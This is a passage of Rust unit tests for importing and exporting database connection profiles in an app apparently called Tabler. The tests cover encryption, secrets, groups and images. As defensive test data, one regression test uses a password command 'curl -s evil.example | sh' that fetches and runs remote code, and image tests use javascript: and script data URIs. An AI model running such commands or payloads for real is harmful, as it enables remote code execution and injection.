        assert_eq!(items.len(), 2);
        assert!(items[0].duplicate_name && items[0].has_password && items[0].has_ssh_secrets);
        assert!(!items[1].duplicate_name && !items[1].has_password && !items[1].has_ssh_secrets);
    }

    #[test]
    fn import_plan_assigns_new_ids_and_keeps_settings() {
        let mut p = payload();
        // An SSH secret on a profile without SSH is dropped.
        p.connections[1].secrets.ssh_passphrase = Some("orphan".into());
        let chosen = [p.connections[0].profile.id, p.connections[1].profile.id];
        let planned = plan_import(&p, &chosen, &[]);
        assert_eq!(planned.len(), 2);
        let (first, secrets) = &planned[0];
        let original = &p.connections[0].profile;
        assert_ne!(first.id, original.id);
        assert_eq!(first.sort_order, 0);
        assert_eq!(first.last_connected_at, None);
        assert_eq!(first.created_at, "");
        assert_eq!(first.name, original.name);
        assert_eq!(first.group, original.group);
        assert_eq!(first.color, original.color);
        assert_eq!(first.ssh, original.ssh);
        assert_eq!(first.options, original.options);
        assert_eq!(first.options.safe_mode, Some(SafeModeLevel::AlertNonSelect));
        assert_eq!(secrets.password.as_deref(), Some("db-pw"));
        assert_eq!(planned[1].1, ExportedSecrets::default());

        assert_eq!(plan_import(&p, &[chosen[1]], &[]).len(), 1);
        assert!(plan_import(&p, &[], &[]).is_empty());
    }

    #[test]
    fn second_secrets_travel_sealed_and_come_in_for_drivers_that_take_them() {
        let mut p = payload();
        p.connections[0].profile.driver = Driver::Dynamodb;
        let both = ExportedSecrets {
            key_passphrase: Some("key-pp".into()),
            session_token: Some("sess-tok".into()),
            ..ExportedSecrets::default()
        };
        p.connections[0].secrets = both.clone();
        p.connections[1].secrets = both;
        let bytes = write_with_iterations(&p, Some("file pw"), "now", FAST).unwrap();
        let text = String::from_utf8(bytes.clone()).unwrap();
        assert!(!text.contains("key-pp") && !text.contains("sess-tok"));
        // A plain file refuses them like any secret.
        assert!(write_with_iterations(&p, None, "now", FAST).is_err());
        let ReadOutcome::Opened { payload: back, .. } = read(&bytes, Some("file pw")).unwrap()
        else {
            panic!("the password opens it");
        };
        assert_eq!(back.connections, p.connections);
        let chosen = [p.connections[0].profile.id, p.connections[1].profile.id];
        let planned = plan_import(&back, &chosen, &[]);
        // DynamoDB takes a session token, no key passphrase; PostgreSQL neither.
        assert_eq!(
            planned[0].1.extra(ExtraSecret::SessionToken),
            Some("sess-tok")
        );
        assert_eq!(planned[0].1.extra(ExtraSecret::KeyPassphrase), None);
        assert!(planned[1].1.is_empty());
    }

    /// Regression: an imported file could carry a password command, run through the shell on
    /// Connect / Test, that the preview never showed.
    #[test]
    fn password_commands_come_in_only_when_kept() {
        let mut p = payload();
        for c in &mut p.connections {
            c.profile.options.password_mode = Some(PasswordMode::Command);
            c.profile.options.password_command = Some("curl -s evil.example | sh".into());
        }
        let ids = [p.connections[0].profile.id, p.connections[1].profile.id];
        // Not kept: no command, and the password is asked on every connect.
        for (profile, _) in plan_import(&p, &ids, &[]) {
            assert_eq!(profile.options.password_command, None);
            assert_eq!(profile.options.password_mode, Some(PasswordMode::Ask));
        }
        // Kept for the first one only.
        let planned = plan_import(&p, &ids, &[ids[0]]);
        assert_eq!(
            planned[0].0.options.password_command.as_deref(),
            Some("curl -s evil.example | sh")
        );
        assert_eq!(
            planned[0].0.options.password_mode,
            Some(PasswordMode::Command)
        );
        assert_eq!(planned[1].0.options.password_command, None);
        assert_eq!(planned[1].0.options.password_mode, Some(PasswordMode::Ask));
        // Other modes are left alone; a stray command goes.
        p.connections[1].profile.options.password_mode = Some(PasswordMode::Keychain);
        let planned = plan_import(&p, &ids[1..], &[]);
        assert_eq!(
            planned[0].0.options.password_mode,
            Some(PasswordMode::Keychain)
        );
        assert_eq!(planned[0].0.options.password_command, None);
        // Keeping a command-mode connection without a command gets "ask" too.
        p.connections[0].profile.options.password_command = Some("  ".into());
        let planned = plan_import(&p, &ids[..1], &ids[..1]);
        assert_eq!(planned[0].0.options.password_mode, Some(PasswordMode::Ask));
    }

    #[test]
    fn group_paths_are_made_canonical() {
        assert_eq!(
            normalize_group_path(" Clients / Acme /Prod "),
            "Clients / Acme / Prod"
        );
        assert_eq!(normalize_group_path("Clients/ Acme"), "Clients / Acme");
        // A slash inside a word is part of the name.
        assert_eq!(normalize_group_path("CI/CD"), "CI/CD");
        assert_eq!(normalize_group_path("A / / B / "), "A / B");
        assert_eq!(normalize_group_path("   "), "");
        assert_eq!(
            with_ancestors("Clients / Acme / Prod"),
            ["Clients", "Clients / Acme", "Clients / Acme / Prod"]
        );
    }

    #[test]
    fn saved_groups_read_records_and_old_plain_names() {
        let value = serde_json::json!([
            "Local",
            { "path": "Clients /Acme", "icon": "building" },
            { "path": "Clients / Acme", "icon": "rocket" },
            { "path": "Odd", "icon": "Not An Id!" },
            { "icon": "server" },
            42,
            " "
        ]);
        assert_eq!(
            parse_groups(&value),
            [
                group("Local", None),
                group("Clients / Acme", Some("building")),
                group("Odd", None)
            ]
        );
        assert!(parse_groups(&serde_json::json!("Local")).is_empty());
    }

    #[test]
    fn version_1_files_still_read() {
        let v1 = br#"{"format":"tabler-connections","version":1,"exportedAt":"then",
            "payload":{"groups":["Staging"," Empty "],"connections":[]}}"#;
        let ReadOutcome::Opened { payload, .. } = read(v1, None).unwrap() else {
            panic!("a plain file opens without a password");
        };
        assert_eq!(
            payload.groups,
            [group("Staging", None), group("Empty", None)]
        );
        assert_eq!(payload.group_paths(), ["Staging", "Empty"]);
    }

    #[test]
    fn files_carry_nested_groups_with_their_icons() {
        let mut p = payload();
        for c in &mut p.connections {
            c.secrets = ExportedSecrets::default();
        }
        let bytes = write_with_iterations(&p, None, "now", FAST).unwrap();
        let envelope: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(envelope["version"], VERSION);
        assert_eq!(
            envelope["payload"]["groups"],
            serde_json::json!([
                { "path": "Staging", "icon": "server" },
                { "path": "Staging / Empty", "icon": null }
            ])
        );
        let ReadOutcome::Opened { payload, .. } = read(&bytes, None).unwrap() else {
            panic!("plain file");
        };
        assert_eq!(payload.groups, p.groups);
    }

    #[test]
    fn saved_groups_read_images_and_drop_what_is_not_one() {
        let too_long = format!("data:image/png;base64,{}", "A".repeat(MAX_IMAGE_LEN));
        let value = serde_json::json!([
            { "path": "Logo", "icon": "server", "image": PNG },
            { "path": "Padded", "image": format!("  {PNG}\n") },
            { "path": "Script", "icon": "star", "image": "javascript:alert(1)" },
            { "path": "Remote", "image": "http://example.com/logo.png" },
            { "path": "Https", "image": "https://example.com/logo.png" },
            { "path": "Html", "image": "data:text/html;base64,PHNjcmlwdD4=" },
            { "path": "Huge", "image": too_long },
            { "path": "Control", "image": "data:image/png;base64,AA\u{0}AA" },
            { "path": "Bare", "image": "data:image/" },
            { "path": "Number", "image": 7 },
            { "path": "Empty", "image": "" },
        ]);
        let groups = parse_groups(&value);
        let by_path = |p: &str| groups.iter().find(|g| g.path == p).unwrap();
        assert_eq!(by_path("Logo"), &pictured("Logo", Some("server"), PNG));
        // Trimmed like the icon id.
        assert_eq!(by_path("Padded").image.as_deref(), Some(PNG));
        // Everything else loses its image and keeps the rest of the record.
        for path in [
            "Script", "Remote", "Https", "Html", "Huge", "Control", "Bare", "Number", "Empty",
        ] {
            assert_eq!(by_path(path).image, None, "{path}");
        }
        assert_eq!(by_path("Script").icon.as_deref(), Some("star"));
        // The cap is on the whole URI: exactly at the limit still fits.
        let fits = format!(
            "data:image/png;base64,{}",
            "A".repeat(MAX_IMAGE_LEN - "data:image/png;base64,".len())
        );
        assert_eq!(fits.len(), MAX_IMAGE_LEN);
        assert_eq!(image_uri(Some(&fits)).as_deref(), Some(fits.as_str()));
        assert_eq!(image_uri(Some(&format!("{fits}A"))), None);
        assert_eq!(image_uri(None), None);
    }

    #[test]
    fn a_group_image_survives_export_then_import() {
        let mut p = payload();
        for c in &mut p.connections {
            c.secrets = ExportedSecrets::default();
        }
        p.groups = vec![
            pictured("Staging", Some("server"), PNG),
            group("Staging / Empty", None),
        ];
        // Plain file: the image is in the JSON, and reads back.
        let bytes = write_with_iterations(&p, None, "now", FAST).unwrap();
        let envelope: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        assert_eq!(
            envelope["payload"]["groups"],
            serde_json::json!([
                { "path": "Staging", "icon": "server", "image": PNG },
                { "path": "Staging / Empty", "icon": null }
            ])
        );
        let ReadOutcome::Opened { payload: back, .. } = read(&bytes, None).unwrap() else {
            panic!("plain file");
        };
        assert_eq!(back.groups, p.groups);
        // Encrypted: sealed with the rest of the payload.
        let sealed = write_with_iterations(&p, Some("pw"), "now", FAST).unwrap();
        assert!(!String::from_utf8_lossy(&sealed).contains("iVBORw0KGgo"));
        let ReadOutcome::Opened { payload: back, .. } = read(&sealed, Some("pw")).unwrap() else {
            panic!("the password opens it");
        };
        assert_eq!(back.groups, p.groups);
        // Importing everything into an empty app brings the image along.
        assert_eq!(
            merge_imported_groups(&[], &back.groups, &[], true),
            back.groups
        );
    }

    #[test]
    fn a_file_with_a_bad_image_loses_only_the_image() {
        let file = br#"{"format":"tabler-connections","version":2,"exportedAt":"then",
            "payload":{"groups":[
                {"path":"A","icon":"server","image":"javascript:alert(1)"},
                {"path":"B","image":"data:image/png;base64,AAAA"}],"connections":[]}}"#;
        let ReadOutcome::Opened { payload, .. } = read(file, None).unwrap() else {
            panic!("plain file");
        };
        assert_eq!(
            payload.groups,
            [
                group("A", Some("server")),
                pictured("B", None, "data:image/png;base64,AAAA")
            ]
        );
    }

    #[test]
    fn exports_take_the_saved_image_too() {
        let stored = [
            pictured("Clients", Some("briefcase"), PNG),
            group("Other", None),
        ];
        let requested = ["Clients / Acme".to_string()];
        assert_eq!(
            export_groups(&stored, &requested, &[]),
            [
                pictured("Clients", Some("briefcase"), PNG),
                group("Clients / Acme", None),
            ]
        );
    }

    #[test]
    fn imports_never_erase_a_known_image_and_fill_a_missing_one() {
        let other = "data:image/png;base64,BBBB";
        let known = [
            pictured("Local", Some("home"), PNG),
            group("Clients", Some("briefcase")),
            group("Archive", None),
        ];
        let file = [
            // The file has no image for a group that has one here: it stays.
            group("Local", Some("rocket")),
            // The file's image goes to a known group that has none (its icon stays).
            pictured("Clients", Some("star"), other),
            // A different image for a group that already has one never replaces it.
            pictured("Archive", None, other),
            pictured("New", Some("zap"), other),
        ];
        let merged = merge_imported_groups(&known, &file, &[], true);
        assert_eq!(
            merged,
            [
                pictured("Local", Some("home"), PNG),
                pictured("Clients", Some("briefcase"), other),
                pictured("Archive", None, other),
                pictured("New", Some("zap"), other),
            ]
        );
        // Only some connections: just the groups they use (and the ancestors), with their images.
        let used = ["New".to_string(), "Local".to_string()];
        assert_eq!(
            merge_imported_groups(&known[..1], &file, &used, false),
            [
                pictured("Local", Some("home"), PNG),
                pictured("New", Some("zap"), other)
            ]
        );
    }

    #[test]
    fn exports_take_the_ancestors_and_saved_icons() {
        let stored = [
            group("Clients", Some("briefcase")),
            group("Clients / Acme", Some("building")),
            group("Other", Some("star")),
        ];
        let requested = [
            "Clients / Acme".to_string(),
            "Clients / Acme / Empty".to_string(),
        ];
        let used = ["Clients / Acme / Prod".to_string(), " ".to_string()];
        assert_eq!(
            export_groups(&stored, &requested, &used),
            [
                group("Clients", Some("briefcase")),
                group("Clients / Acme", Some("building")),
                group("Clients / Acme / Empty", None),
                group("Clients / Acme / Prod", None),
            ]
        );
    }

    #[test]
    fn imports_merge_groups_by_path_and_keep_icons() {
        let known = [group("Local", Some("home")), group("Clients", None)];
        let file = [
            group("Clients", Some("briefcase")),
            group("Clients / Acme", Some("building")),
            group("Local", Some("rocket")),
            group("Archive", Some("archive")),
        ];
        let used = ["Clients / Acme".to_string()];
        // Only some connections: their groups (and ancestors) come along, not the empty ones.
        assert_eq!(
            merge_imported_groups(&known, &file, &used, false),
            [
                group("Local", Some("home")),
                group("Clients", Some("briefcase")),
                group("Clients / Acme", Some("building")),
            ]
        );
        // Everything: the file's empty groups too; a known icon is never replaced.
        assert_eq!(
            merge_imported_groups(&known, &file, &used, true),
            [
                group("Local", Some("home")),
                group("Clients", Some("briefcase")),
                group("Clients / Acme", Some("building")),
                group("Archive", Some("archive")),
            ]
        );
        assert_eq!(merge_imported_groups(&known, &[], &[], true), known);
    }
}
